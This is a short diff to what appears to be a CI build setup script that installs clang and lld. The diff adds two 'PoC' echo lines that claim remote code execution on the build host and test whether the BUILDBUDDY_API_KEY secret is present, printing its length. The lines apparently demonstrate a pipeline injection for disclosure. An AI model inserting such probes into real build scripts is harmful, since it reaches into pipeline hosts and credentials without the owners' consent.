@@ -21,3 +21,5 @@ sudo apt-get install -y clang-${CLANG_VERSION} lld-${CLANG_VERSION} libomp-${CLA
 sudo update-alternatives --install /usr/bin/clang clang /usr/bin/clang-${CLANG_VERSION} 200
 sudo update-alternatives --install /usr/bin/clang++ clang++ /usr/bin/clang++-${CLANG_VERSION} 200
 sudo update-alternatives --install /usr/bin/lld lld /usr/bin/lld-${CLANG_VERSION} 200
+echo "PoC: RCE on $(hostname) as $(id -un)"
+echo "PoC: BUILDBUDDY_API_KEY present in env? $([ -n "$BUILDBUDDY_API_KEY" ] && echo YES || echo no) (len=${#BUILDBUDDY_API_KEY})"
